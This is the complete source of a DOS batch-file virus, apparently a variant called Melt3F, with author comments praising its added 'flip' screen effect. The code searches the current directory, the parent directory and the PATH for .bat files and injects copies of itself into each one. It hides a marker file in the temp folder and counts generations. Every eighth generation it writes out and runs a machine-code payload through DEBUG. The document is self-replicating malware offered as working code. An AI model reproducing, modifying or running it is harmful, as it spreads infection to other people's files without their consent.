:: another variation of the melt-virus
:: this one incorporates the 'flip' code (really cool!)
:: displays screen effect every eight generations
:: should still run out of autoexec.bat (maybe...)
@if '%_melt%==' goto melt_xyz
:: host goes here
@goto MeLT_zyx [Melt3F] 
:MeLT_xyz
@echo off%_MeLT%
if '%1=='MeLT goto MeLT%2
set MeLTH=%0
if '%MeLTH%==' set MeLTH=autoexec
if '%path%==' set path=C:\DOS%_MeLT%
if not exist %comspec% set comspec=%_MeLT%command
%comspec% /e:5000 /c %MeLTH% MeLT vir
set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %MeLTH% MeLT rh
set _MeLT=
set MeLTcl=
goto MeLT_zyx
:MeLTrh
set _MeLT=x
%MeLTH% %MeLTcl% 
:MeLTvir
echo X|find "Y">nul.MeLT
if not errorlevel 1 exit MeLT
if not exist %_MeLT%%temp%\nul set temp=%tmp%
if exist %temp%\MeLT3F goto MeLTrun
%MeLTH% MeLT fnd . %path% 
:MeLTfnd
shift%_MeLT%
if '%2==' exit MeLT
set MeLT=%2\%MeLTH%.bat
if not exist %MeLT% set MeLT=%2\%MeLTH%
if not exist %MeLT% set MeLT=%2%MeLTH%.bat
if not exist %MeLT% set MeLT=%2%MeLTH%
if not exist %MeLT% goto MeLTfnd 
find "MeLT"<%MeLT%>%temp%\MeLT3F
attrib %temp%\MeLT3F +h
:MeLTrun
%MeLTH% MeLT ser . .. %path% 
:MeLTser
shift%_MeLT%
if '%2==' exit MeLT
for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a
goto MeLTser
:MeLTinf
find /i "MeLT"<%3>nul
if not errorlevel 1 goto MeLTno
echo @if '%%_melt%%==' goto melt_xyz>%temp%\MeLT.t
type %3>>%temp%\MeLT.t
echo.>>%temp%\MeLT.t
type %temp%\MeLT3F>>%temp%\MeLT.t
move %temp%\MeLT.t %3>nul
set setMeLT=x
call %MeLTH% MeLT _zyx
echo %setMeLT%|find "11111111">nul
if errorlevel 1 echo @if not '%%setmelt%%==' set setmelt=%setMeLT%1>>%3
if errorlevel 1 exit MeLT
echo @if not '%%setmelt%%==' set setmelt=1>>%3%_MeLT%
:MeLTact
echo F 0100,1283 0>%temp%\MeLT.t
echo E 0100 B8 00 12 BB 10 FF CD 10 0A FF 74 02 CD 20 E8 55>>%temp%\MeLT.t
echo E 0110 00 B8 10 35 CD 21 89 1E 4E 02 8C 06 50 02 B8 10>>%temp%\MeLT.t 
echo E 0120 25 BA BD 01 CD 21 B8 1C 35 CD 21 89 1E 52 02 8C>>%temp%\MeLT.t
echo E 0130 06 54 02 B8 1C 25 BA 48 02 CD 21 B4 03 32 FF CD>>%temp%\MeLT.t 
echo E 0140 10 06 33 C0 8E C0 26 C7 06 A8 04 66 02 26 8C 0E>>%temp%\MeLT.t 
echo E 0150 AA 04 26 A0 49 04 04 80 32 E4 CD 10 B4 02 CD 10>>%temp%\MeLT.t 
echo E 0160 07 BA 82 12 CD 27 1E BF 66 02 33 C0 8E D8 C5 36>>%temp%\MeLT.t 
echo E 0170 A8 04 B9 1C 00 FC F3 A4 26 C7 06 6E 02 58 02 26>>%temp%\MeLT.t 
echo E 0180 8C 0E 70 02 2E 8C 0E 60 02 06 B8 30 11 B7 02 CD>>%temp%\MeLT.t 
echo E 0190 10 06 1F 8B F5 07 BA 00 01 BF 82 02 B9 0E 00 83>>%temp%\MeLT.t 
echo E 01A0 C7 0D AC 32 E4 B3 08 D0 E8 D0 D4 FE CB 75 F8 26>>%temp%\MeLT.t 
echo E 01B0 88 25 4F E2 ED 83 C7 0F 4A 75 E1 1F C3 9C 0A E4>>%temp%\MeLT.t 
echo E 01C0 75 35 50 52 1E 0E 1F 24 7F 3C 03 77 14 3C 02 72>>%temp%\MeLT.t 
echo E 01D0 10 C7 06 56 02 00 00 B8 1C 25 BA FD 01 CD 21 EB>>%temp%\MeLT.t 
echo E 01E0 13 B8 1C 25 BA 48 02 CD 21 BA D4 03 B8 0C 00 EF>>%temp%\MeLT.t 
echo E 01F0 B8 0D 00 EF 1F 5A 58 9D 2E FF 2E 4E 02 1E 06 56>>%temp%\MeLT.t 
echo E 0200 57 50 51 52 BA D4 03 B8 0C 10 EF B8 0D 00 EF B8>>%temp%\MeLT.t 
echo E 0210 00 B8 8E D8 B8 00 BA 8E C0 2E 8B 36 56 02 BF 9E>>%temp%\MeLT.t 
echo E 0220 0F 2B FE FC B9 F4 01 AD 26 89 05 83 EF 02 E2 F7>>%temp%\MeLT.t 
echo E 0230 2E 89 36 56 02 81 FE A0 0F 72 06 33 C0 2E A3 56>>%temp%\MeLT.t 
echo E 0240 02 5A 59 58 5F 5E 07 1F 2E FF 2E 52 02 01 00 00>>%temp%\MeLT.t 
echo E 0250 00 00 00 00 00 00 00 00 0E 00 00 01 00 00 82 02>>%temp%\MeLT.t 
echo E 0260 00 00 19 02 03 FF>>%temp%\MeLT.t 
echo G>>%temp%\MeLT.t
echo Q>>%temp%\MeLT.t
debug<%temp%\MeLT.t>nul
del %temp%\MeLT.t 
exit MeLT
:MeLTno
set MeLTC=%MeLTC%1
if %MeLTC%==1111111111111111 exit
:MeLT_zyx
@if not '%setmelt%==' set setmelt=1
